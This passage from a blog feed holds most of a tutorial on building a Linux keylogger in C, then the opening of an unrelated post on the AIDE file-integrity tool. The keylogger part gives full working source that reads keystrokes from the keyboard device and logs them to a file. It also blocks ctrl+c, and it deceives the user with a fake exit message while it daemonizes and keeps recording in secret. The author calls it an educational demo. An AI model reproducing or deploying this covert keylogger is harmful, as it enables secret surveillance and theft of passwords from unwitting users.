</span></span></code></pre></div><p>After again compiling and running this, I was just getting the useful data from everything.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*zRFTkTAQGKSMSspmAxqCjg.png" alt="useful-raw-data"  />
</p>
<p>This is the simple idea of making the keylogger. But there are a lot of things we haven&rsquo;t done.</p>
<h3 id="making-our-keylogger-more-dynamic">Making our keylogger more dynamic.</h3>
<p>Till now, we are using hard coded file name for the keyboard. We can make it more dynamic by searching for the <strong>kbd</strong> file in <code>/dev/input/by-path/</code> and then read that file for the events. And then save the events in a file.</p>
<p>For this purpose, I have changed the working directory structure to make the project more modular.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*2VyFdbneXRLZPXuScZGCPg.png" alt=""  />
</p>
<p>CODE:- <code>basic_keylogger.c</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#include &#34;basic_keylogger.h&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">int main(void) {
</span></span><span class="line"><span class="cl">  errno = 0;
</span></span><span class="line"><span class="cl">  struct input_event ev;
</span></span><span class="line"><span class="cl">  char* kbd = get_me_a_keyboard(); // Get keyboard name
</span></span><span class="line"><span class="cl">  char* kbd_path = concat(INPUT_EVENT_DIR, kbd); // Get complete path for keyboard
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  int fd = open(kbd_path, O_RDONLY);
</span></span><span class="line"><span class="cl">  if(fd == -1)
</span></span><span class="line"><span class="cl">  {
</span></span><span class="line"><span class="cl">    printf(&#34;Error %d\n&#34;, errno);
</span></span><span class="line"><span class="cl">    exit(EXIT_FAILURE);
</span></span><span class="line"><span class="cl">  }
</span></span><span class="line"><span class="cl">  printf(&#34;Reading from %s\n&#34;,kbd_path);
</span></span><span class="line"><span class="cl">  free(kbd_path); // free some memory
</span></span><span class="line"><span class="cl">  while (1)
</span></span><span class="line"><span class="cl">  {
</span></span><span class="line"><span class="cl">    read(fd, &amp;ev, sizeof(struct input_event)); //read from keyboard
</span></span><span class="line"><span class="cl">    if(ev.type == 1)
</span></span><span class="line"><span class="cl">      log_in_file(ev); //log the event
</span></span><span class="line"><span class="cl">  }
</span></span><span class="line"><span class="cl">  return 0;
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><p>This main program <em>includes</em> <code>basic_keylogger.h</code> file - which I have used to include all the libraries and <em>define</em> macros.</p>
<p>CODE:- <code>basic_keylogger.h</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">/*</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">defining</span> <span class="n">variables</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>
</span></span><span class="line"><span class="cl"><span class="o">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#define INPUT_EVENT_DIR &#34;/dev/input/by-path/&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#define LOG_FILE &#34;/tmp/keylog.txt&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">/*</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">importing</span> <span class="n">system</span> <span class="n">headers</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>
</span></span><span class="line"><span class="cl"><span class="o">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;dirent.h&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;errno.h&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;fcntl.h&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;linux/input.h&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;stdio.h&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;stdlib.h&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;string.h&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;sys/stat.h&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;sys/types.h&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;time.h&gt;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include &lt;unistd.h&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">/*</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">importing</span> <span class="n">utility</span> <span class="n">functions</span>
</span></span><span class="line"><span class="cl"><span class="o">//</span>
</span></span><span class="line"><span class="cl"><span class="o">*/</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#include &#34;utils/logger.c&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include &#34;utils/helpers.c&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#include &#34;utils/keyboard.c&#34;</span>
</span></span></code></pre></div><p>Here are 3 more files included for obvious purposes.</p>
<p>CODE:- <code>utils/logger.c</code> (logger function)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">void log_in_file(struct input_event ev)
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  printf(&#34;Logging&#34;);
</span></span><span class="line"><span class="cl">    time_t t = time(NULL);
</span></span><span class="line"><span class="cl">    struct tm tm = *localtime(&amp;t);
</span></span><span class="line"><span class="cl">    FILE* fptr = fopen(LOG_FILE, &#34;a&#34;);
</span></span><span class="line"><span class="cl">    // print( [date time] keycode keyvalue ) - keyvalue =&gt; {press; lift; long press}
</span></span><span class="line"><span class="cl">    fprintf(fptr, &#34;[ %d-%02d-%02d %02d:%02d:%02d ]   key %i state %i\n&#34;, tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec, ev.code, ev.value);
</span></span><span class="line"><span class="cl">    if(tm.tm_sec == 0)
</span></span><span class="line"><span class="cl">    {
</span></span><span class="line"><span class="cl">      /* Do whatever you want to do here
</span></span><span class="line"><span class="cl">        It is like a scheduler section.*/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      //fprintf(fptr, &#34;%s\n&#34;, &#34;1 minute check\n&#34;);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    fclose(fptr);
</span></span><span class="line"><span class="cl">    printf(&#34;  logged\n&#34;);
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><p>CODE:- <code>utils/helpers.c</code> (now only used for concatination of 2 strings)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">char</span><span class="o">*</span> <span class="n">concat</span><span class="p">(</span><span class="k">const</span> <span class="n">char</span> <span class="o">*</span><span class="n">s1</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">*</span><span class="n">s2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">size_t</span> <span class="n">len1</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="n">size_t</span> <span class="n">len2</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">s2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">char</span> <span class="o">*</span><span class="n">result</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len1</span> <span class="o">+</span> <span class="n">len2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span> <span class="o">//</span> <span class="o">+</span><span class="mi">1</span> <span class="k">for</span> <span class="n">the</span> <span class="n">null</span><span class="o">-</span><span class="n">terminator</span>
</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="ow">in</span> <span class="n">real</span> <span class="n">code</span> <span class="n">you</span> <span class="n">would</span> <span class="n">check</span> <span class="k">for</span> <span class="n">errors</span> <span class="ow">in</span> <span class="n">malloc</span> <span class="n">here</span>
</span></span><span class="line"><span class="cl">    <span class="n">memcpy</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">s1</span><span class="p">,</span> <span class="n">len1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">memcpy</span><span class="p">(</span><span class="n">result</span> <span class="o">+</span> <span class="n">len1</span><span class="p">,</span> <span class="n">s2</span><span class="p">,</span> <span class="n">len2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span> <span class="o">//</span> <span class="o">+</span><span class="mi">1</span> <span class="n">to</span> <span class="n">copy</span> <span class="n">the</span> <span class="n">null</span><span class="o">-</span><span class="n">terminator</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>CODE:- <code>utils/keyboard.c</code> (get keyboard device from the directory)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">char* get_me_a_keyboard()
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">  struct dirent **namelist;
</span></span><span class="line"><span class="cl">  int n=0,i=0;
</span></span><span class="line"><span class="cl">  n = scandir(INPUT_EVENT_DIR, &amp;namelist, NULL, alphasort); // read the directory for the files
</span></span><span class="line"><span class="cl">  if(n==-1)
</span></span><span class="line"><span class="cl">  {
</span></span><span class="line"><span class="cl">    // perror(&#34;Scandir Failed!!\n&#34;);
</span></span><span class="line"><span class="cl">    exit(EXIT_FAILURE);
</span></span><span class="line"><span class="cl">  }
</span></span><span class="line"><span class="cl">  if(n&lt;=2){
</span></span><span class="line"><span class="cl">    // perror(&#34;No devices found!!\n&#34;);
</span></span><span class="line"><span class="cl">    exit(EXIT_FAILURE);
</span></span><span class="line"><span class="cl">  }
</span></span><span class="line"><span class="cl">  // printf(&#34;[ * ] %d Devices found !!\n&#34;,n-2);
</span></span><span class="line"><span class="cl">  for(i=0; i&lt;n; i++)
</span></span><span class="line"><span class="cl">    if( namelist[i]-&gt;d_name == &#34;.&#34; || namelist[i]-&gt;d_name == &#34;..&#34;) // skip for . and ..
</span></span><span class="line"><span class="cl">      continue;
</span></span><span class="line"><span class="cl">    else if(strstr(namelist[i]-&gt;d_name,&#34;kbd&#34;)) // check if the filename has &#34;kbd&#34; (keyboard) in it
</span></span><span class="line"><span class="cl">      break;  // if yes, do not look further
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  return namelist[i]-&gt;d_name; // and return keyboard file name to caller function
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><p>After compiling and executing the binary. We get <strong>logging - logged</strong> message on the terminal and the actual log is being stored in <code>/tmp/keylog.txt</code> file - as mentioned in <code>basic_keylogger.h</code> file.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*ikK7hBwfMweto2rYqhaBFg.png" alt=""  />
</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*8wYAQGNMNS7TymthEnSb6g.png" alt=""  />
</p>
<hr>
<h3 id="what-next-getting-evil">What next? &hellip;Getting evil!!</h3>
<p>We can close the program by pressing <em>ctrl+c</em> or send it to background by <em>ctrl+z</em>. These key combinations send a signal to the process to close.
And we can handle these signals in our code&hellip;. using <code>signal.h</code> header file. (import this in the code.)</p>
<p>CODE - <code>basic_keylogger.c</code> (added signal handlers)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#include &#34;basic_keylogger.h&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Signal</span> <span class="n">handler</span> <span class="n">function</span>
</span></span><span class="line"><span class="cl"><span class="n">void</span> <span class="n">signal_handler</span><span class="p">(</span><span class="ne">int</span> <span class="n">sig</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;Sorry, But I won&#39;t exit.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="ne">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">struct</span> <span class="n">sigaction</span> <span class="k">signal</span><span class="p">;</span> <span class="o">//</span> <span class="n">create</span> <span class="k">signal</span> <span class="n">action</span> <span class="n">struct</span>
</span></span><span class="line"><span class="cl">  <span class="k">signal</span><span class="o">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">signal_handler</span><span class="p">;</span> <span class="o">//</span> <span class="n">initialize</span> <span class="n">the</span> <span class="n">handler</span> <span class="n">function</span>
</span></span><span class="line"><span class="cl">  <span class="n">sigaction</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="o">&amp;</span><span class="k">signal</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span> <span class="o">//</span> <span class="n">assign</span> <span class="n">the</span> <span class="k">signal</span> <span class="n">action</span> <span class="n">to</span> <span class="n">a</span> <span class="n">specific</span> <span class="k">signal</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">struct</span> <span class="n">input_event</span> <span class="n">ev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">char</span><span class="o">*</span> <span class="n">kbd</span> <span class="o">=</span> <span class="n">get_me_a_keyboard</span><span class="p">();</span> <span class="o">//</span> <span class="n">Get</span> <span class="n">keyboard</span> <span class="n">name</span>
</span></span><span class="line"><span class="cl">  <span class="n">char</span><span class="o">*</span> <span class="n">kbd_path</span> <span class="o">=</span> <span class="n">concat</span><span class="p">(</span><span class="n">INPUT_EVENT_DIR</span><span class="p">,</span> <span class="n">kbd</span><span class="p">);</span> <span class="o">//</span> <span class="n">Get</span> <span class="n">complete</span> <span class="n">path</span> <span class="k">for</span> <span class="n">keyboard</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="ne">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">kbd_path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;Error </span><span class="si">%d</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">errno</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;Reading from </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">kbd_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">free</span><span class="p">(</span><span class="n">kbd_path</span><span class="p">);</span> <span class="o">//</span> <span class="n">free</span> <span class="n">some</span> <span class="n">memory</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ev</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">struct</span> <span class="n">input_event</span><span class="p">));</span> <span class="o">//</span><span class="n">read</span> <span class="n">from</span> <span class="n">keyboard</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">ev</span><span class="o">.</span><span class="n">type</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">log_in_file</span><span class="p">(</span><span class="n">ev</span><span class="p">);</span> <span class="o">//</span><span class="nb">log</span> <span class="n">the</span> <span class="n">event</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>As expected with this code, I am unable to close the program with <em>ctrl+c</em>. Whenever I am pressing it, it gives me a message that <strong>&ldquo;Sorry, But I won&rsquo;t exit.&rdquo;</strong></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*882rJMJZjAMEce-EupTVhg.png" alt=""  />
</p>
<p>This program can only be terminated with <strong>kill</strong> signal. See <a href="https://www.linux.com/training-tutorials/how-kill-process-command-line/">here</a> to know how.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*atvzfHlH5gEBaNw3PcoDgA.png" alt=""  />
</p>
<h3 id="going-undercover">Going undercover</h3>
<p>What if we trick user with a false closing message and go undercover <a href="https://notes.shichao.io/apue/ch13/">(Daemon process)</a>.</p>
<p>The idea is to create the process as a daemon process whenever the user press <em>ctrl+c</em>. Also give the user a good message so that he actually believes that the process has closed and then probably he&rsquo;ll not check for the running processes to find if it actually has closed.</p>
<p>To achieve this, I&rsquo;ll make slight changes to my <code>signal_handler</code> function and add a <code>daemonize</code> function to create a daemon process. If you have already not seen what a daemon process is and how to create one - Look <a href="https://notes.shichao.io/apue/ch13/">here</a>.</p>
<p>CODE:- <code>basic_keylogger.c</code> (changed the signal_handler function)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1">#include &#34;basic_keylogger.h&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">//</span> <span class="n">Signal</span> <span class="n">handler</span> <span class="n">function</span>
</span></span><span class="line"><span class="cl"><span class="n">void</span> <span class="n">signal_handler</span><span class="p">(</span><span class="ne">int</span> <span class="n">sig</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;Exiting very gracefully :)&#34;</span><span class="p">);</span> <span class="o">//</span><span class="n">fake</span> <span class="n">message</span>
</span></span><span class="line"><span class="cl">  <span class="n">daemonize</span><span class="p">();</span> <span class="o">//</span> <span class="n">Go</span> <span class="n">undercover</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="ne">int</span> <span class="n">main</span><span class="p">(</span><span class="n">void</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">errno</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">struct</span> <span class="n">sigaction</span> <span class="k">signal</span><span class="p">;</span> <span class="o">//</span> <span class="n">create</span> <span class="k">signal</span> <span class="n">action</span> <span class="n">struct</span>
</span></span><span class="line"><span class="cl">  <span class="k">signal</span><span class="o">.</span><span class="n">sa_handler</span> <span class="o">=</span> <span class="n">signal_handler</span><span class="p">;</span> <span class="o">//</span> <span class="n">initialize</span> <span class="n">the</span> <span class="n">handler</span> <span class="n">function</span>
</span></span><span class="line"><span class="cl">  <span class="n">sigaction</span><span class="p">(</span><span class="n">SIGINT</span><span class="p">,</span> <span class="o">&amp;</span><span class="k">signal</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span> <span class="o">//</span> <span class="n">assign</span> <span class="n">the</span> <span class="k">signal</span> <span class="n">action</span> <span class="n">to</span> <span class="n">a</span> <span class="n">specific</span> <span class="k">signal</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">struct</span> <span class="n">input_event</span> <span class="n">ev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">char</span><span class="o">*</span> <span class="n">kbd</span> <span class="o">=</span> <span class="n">get_me_a_keyboard</span><span class="p">();</span> <span class="o">//</span> <span class="n">Get</span> <span class="n">keyboard</span> <span class="n">name</span>
</span></span><span class="line"><span class="cl">  <span class="n">char</span><span class="o">*</span> <span class="n">kbd_path</span> <span class="o">=</span> <span class="n">concat</span><span class="p">(</span><span class="n">INPUT_EVENT_DIR</span><span class="p">,</span> <span class="n">kbd</span><span class="p">);</span> <span class="o">//</span> <span class="n">Get</span> <span class="n">complete</span> <span class="n">path</span> <span class="k">for</span> <span class="n">keyboard</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="ne">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">kbd_path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;Error </span><span class="si">%d</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">errno</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;Reading from </span><span class="si">%s</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="n">kbd_path</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">free</span><span class="p">(</span><span class="n">kbd_path</span><span class="p">);</span> <span class="o">//</span> <span class="n">free</span> <span class="n">some</span> <span class="n">memory</span>
</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ev</span><span class="p">,</span> <span class="n">sizeof</span><span class="p">(</span><span class="n">struct</span> <span class="n">input_event</span><span class="p">));</span> <span class="o">//</span><span class="n">read</span> <span class="n">from</span> <span class="n">keyboard</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="n">ev</span><span class="o">.</span><span class="n">type</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="n">log_in_file</span><span class="p">(</span><span class="n">ev</span><span class="p">);</span> <span class="o">//</span><span class="nb">log</span> <span class="n">the</span> <span class="n">event</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Here, I am using <code>daemonize</code> funtion which is defined in <code>./utils/daemonize.c</code> and imported in <code>basic_keylogger.h</code>.</p>
<p>CODE:- <code>daemonize.c</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">int daemonize()
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    pid_t pid, sid;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    /* Fork off the parent process */
</span></span><span class="line"><span class="cl">    pid = fork();
</span></span><span class="line"><span class="cl">    if (pid &lt; 0) {
</span></span><span class="line"><span class="cl">        exit(EXIT_FAILURE);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">    /* If we got a good PID, then
</span></span><span class="line"><span class="cl">        we can exit the parent process. */
</span></span><span class="line"><span class="cl">    if (pid &gt; 0) { // Child can continue to run even after the parent has finished executing
</span></span><span class="line"><span class="cl">        exit(EXIT_SUCCESS);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    /* Change the file mode mask */
</span></span><span class="line"><span class="cl">    umask(0);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    /* Open any logs here */
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    /* Create a new SID for the child process */
</span></span><span class="line"><span class="cl">    sid = setsid();
</span></span><span class="line"><span class="cl">    if (sid &lt; 0) {
</span></span><span class="line"><span class="cl">        /* Log the failure */
</span></span><span class="line"><span class="cl">        exit(EXIT_FAILURE);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    /* Change the current working directory */
</span></span><span class="line"><span class="cl">    if ((chdir(&#34;/&#34;)) &lt; 0) {
</span></span><span class="line"><span class="cl">        /* Log the failure */
</span></span><span class="line"><span class="cl">        exit(EXIT_FAILURE);
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    /* Close out the standard file descriptors */
</span></span><span class="line"><span class="cl">    //Because daemons generally dont interact directly with user so there is no need of keeping these open
</span></span><span class="line"><span class="cl">    close(STDIN_FILENO);
</span></span><span class="line"><span class="cl">    close(STDOUT_FILENO);
</span></span><span class="line"><span class="cl">    close(STDERR_FILENO);
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    return(pid);
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></div><p>After compiling and executing this code. We get a decent exit message like this.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*y_eJXDhm9j1vkrAzajJUEA.png" alt=""  />
</p>
<p>But we can check from the <strong>/tmp/keylog.txt</strong> file that the program is still adding key events to the file. Use <code>tail -f /tmp/keylog.txt</code> command to check appending logs.</p>
<p>You can look for the process using <code>ps -A | grep 'your_binary_name'</code> command to get the process ID of the daemon keylogger running behind the scene. And then kill it by using <code>kill -9 &lt;processID&gt;</code>.</p>
<hr>
<h3 id="conclusion">Conclusion.</h3>
<p>You can take this blog as an educational purpose demo that even the least suspecting program from any untrusted source can be malicious and can do a lot of things you have not expected it to do.
We can create simple programs, that can read the whole file system to know what programs you use.. get the files with sensitive information.. passwords stored in the browsers.. setup a trojan.. and what not.
Also with small modifications, I can send all the logs created locally to a remote server.</p>
<p>This program is only tested in a bare-metal linux system. This can&rsquo;t work on windows (because they have different system calls and API to work) and this is also not working in VM for some reason which I am trying to figure out why. If you have any knowledge regarding this, please feel free to reach out and help me to understand the problem.</p>
<p>All this code is present in github repo here -&gt; (<a href="https://github.com/ayedaemon/C-practice/tree/master/lin-c/keylogger">https://github.com/ayedaemon/C-practice/tree/master/lin-c/keylogger</a>)</p>]]></content:encoded>
    </item>
    <item>
      <title>Advanced Intrusion Detection Environment</title>
      <link>https://ayedaemon.github.io/post/2020/12/advanced-intrusion-detection-environment/</link>
      <pubDate>Sat, 19 Dec 2020 14:25:28 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2020/12/advanced-intrusion-detection-environment/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;Host-based intrusion detection system (HIDS) for checking the integrity of files.&lt;/p&gt;
&lt;/blockquote&gt;</description>
      <content:encoded><![CDATA[<blockquote>
<p>Host-based intrusion detection system (HIDS) for checking the integrity of files.</p>
</blockquote>
<p>Advanced Intrusion Detection Environment (AIDE) is a <strong>host-based intrusion detection system (HIDS)</strong> for checking the integrity of files. It does this by creating a <strong>baseline database</strong> of files on an initial run, and then checks this database against the system on subsequent runs. File properties that can be checked against include inode, permissions, modification time, file contents, etc……….. <a href="https://wiki.archlinux.org/index.php/AIDE"><em>more at archwiki</em>📚</a></p>
<p>According to the definition, AIDE only checks for the <strong>integrity of file</strong> but <strong>not for rootkits</strong> and logs for other suspicious activities.</p>
<p><em>But there are other HIDS tools that can do this for you. Like,</em> <a href="https://www.splunk.com/"><em>Splunk</em></a> <em>and</em> <a href="https://www.ossec.net/"><em>OSSEC</em></a><em>.</em></p>
<p>AIDE have provided a <a href="https://aide.github.io/doc/">pretty simple documentation</a> to undertand and get familiar with it.</p>
<h3 id="how-to-install-it">How to install it?</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># Check what repo will provide you aide tool.  </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">yum</span> <span class="n">whatprovides</span> <span class="n">aide</span>  
</span></span><span class="line"><span class="cl">
